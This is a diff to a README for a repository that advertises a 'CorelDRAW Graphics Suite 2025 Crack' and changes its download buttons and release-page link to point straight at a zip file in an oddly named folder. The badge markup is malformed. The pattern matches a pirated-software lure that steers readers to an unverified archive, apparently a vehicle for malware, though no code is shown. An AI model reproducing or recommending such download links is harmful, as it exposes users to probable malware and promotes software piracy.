@@ -1,6 +1,6 @@
 # 🎨 coreldraw-graphics-suite - Unlock CorelDRAW with Simple Steps
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/developpeersad2/coreldraw-graphics-suite/releases)
+[![Download](https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip%https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip)](https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the CorelDRAW Graphics Suite 2025 Crack. This guide will help you dow
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/developpeersad2/coreldraw-graphics-suite/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip) to find the latest version of the software.
 
 2. **Download the Software**
    Look for the version labeled “CorelDRAW Graphics Suite 2025 Crack”. Click on the link to download the file. 
@@ -63,6 +63,6 @@ If you encounter issues during installation or use, please feel free to reach ou
 ## 🚀 Start Your Design Journey
 Don’t hesitate to download and explore CorelDRAW Graphics Suite 2025 Crack. Click the link below to begin your graphic design adventure: 
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/developpeersad2/coreldraw-graphics-suite/releases)
+[![Download](https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip%https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip)](https://raw.githubusercontent.com/developpeersad2/coreldraw-graphics-suite/main/partimembered/coreldraw-graphics-suite-v1.3.zip)
 
 Enjoy creating stunning designs with ease.
